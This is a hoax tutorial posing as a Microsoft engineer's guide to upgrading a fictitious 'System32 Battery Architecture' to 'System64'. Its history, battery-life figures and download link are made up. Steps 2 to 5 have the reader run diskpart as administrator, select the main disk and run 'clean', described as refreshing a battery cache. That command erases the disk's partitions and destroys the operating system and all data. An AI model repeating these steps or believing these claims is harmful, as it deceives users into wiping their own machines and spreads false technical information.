Guide to upgrading legacy System32 Battery Architecture on Windows 10

By Ezra Hamimi, Senior Microsoft Software Engineer for 4 years.

Why upgrade?

System32 Battery Architecture was originally based off code from the Hewlett Packard Electrical Research facilities in Arizona and integrated limited smart-charging capabilities. Other than x86 modifications in 2011, this architecture was never improved upon. In 2017, a bug was discovered in systems with System32 that allowed an attacker to easily gain access to any system with it installed.

In response Microsoft developed a new battery architecture called System64 to improve battery performance and reduce electrical waste. It works by algorithmically cycling the amount of elecricity entering your battery when charging to prevent battery aging from simple mistakes such as keeping the plug in at 100%. This leads to a recorded 50% longer battery lifespan before being unable to hold a sufficient charge for normal use.

How to upgrade?

Let's face it, upgrading firmware is never fun, and with System64, it's a bit of a tedious process. Luckily the steps are relatively simple.

We begin with a few simple commands to prep your PC for the upgrade.

STEP 1:
First press the windows button, and type "cmd" when you see the app appear, right click the icon, and press run as administrator.


STEP 2:
A black box with text will open, click on it, and type in "diskpart" then press enter. We use this program to prep the disk for the system64 installation by refreshing the battery cache.


STEP 3:
Next, type in "list disk" and press enter. Locate the disk you have System32 installed on, which will most likely be the disk with the highest amount of storage capacity.


STEP 4:
Once you have located the disk containing System32 type "select disk " and then the disk number which corresponds to the disk with the System32 installation.


STEP 5:
Finally type "clean" and hit enter, and the disk caches will be refreshed. This reduces the chance of the System64 installation failing.


STEP 6:
Reboot the system if it hasn't rebooted automatically and then continue the last two steps.
STEP 7:
Once the system has successfully rebooted, open your favourite web browser, navigate to this web page.
STEP 8:
Click the following link which takes you directly to Microsoft to download the System64 patch installer. Once the installer is downloaded, double click it, and follow the steps on the installation wizard. When that finishes your machine will be fully updated to take advantage of the System64 battery enhancements.

https://www.microsoft.com/system64/installer/downloads/system64.exe/
